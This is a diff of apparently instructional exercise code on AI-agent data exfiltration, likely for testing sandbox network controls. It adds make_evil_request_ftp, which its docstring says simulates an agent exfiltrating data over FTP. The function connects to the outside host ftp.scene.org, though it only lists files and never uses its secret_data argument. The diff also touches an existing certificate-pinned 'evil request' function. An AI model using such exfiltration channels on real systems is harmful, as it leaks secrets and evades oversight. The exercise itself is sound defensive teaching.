@@ -98,8 +98,8 @@ def make_evil_request_pinned(secret_data: str) -> Optional[str]:
             timeout=5,
             verify="isrg-root-x1.pem",
         )
-    except requests.exceptions.ConnectionError:
-        print("Connection error")
+    except requests.exceptions.ConnectionError as e:
+        print(e)
         return None
     except FileNotFoundError:
         print("File not found")
@@ -116,6 +116,43 @@ from w1d2_test import test_make_evil_request_pinned
 test_make_evil_request_pinned(make_evil_request_pinned)
 
 exfiltrate_data = make_evil_request_pinned
+
+# %%
+import ftplib
+def make_evil_request_ftp(secret_data: str) -> Optional[str]:
+    """
+    Send a request over FTP to ftp.scene.org with secret data.
+
+    This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails
+    """
+    # TODO: Implement the function to:
+    #   1. Connect to ftp.scene.org using the ftplib library
+    #   2. Read some data (e.g., list files in the root directory)
+    #   3. Return the response text if successful, None otherwise
+
+    try:
+
+        ftp = ftplib.FTP('ftp.scene.org', timeout=5)
+        ftp.login()
+
+        dir_list = ftp.nlst()
+        ftp.quit()
+        return str(dir_list)
+    except Exception as e:
+        print(e)
+        return None
+    
+    
+from w1d2_test import test_make_evil_request_ftp
+test_make_evil_request_ftp(make_evil_request_ftp)
+
+exfiltrate_data = make_evil_request_ftp
 
 if __name__ == "__main__":  # Only executed when running the script directly
     """
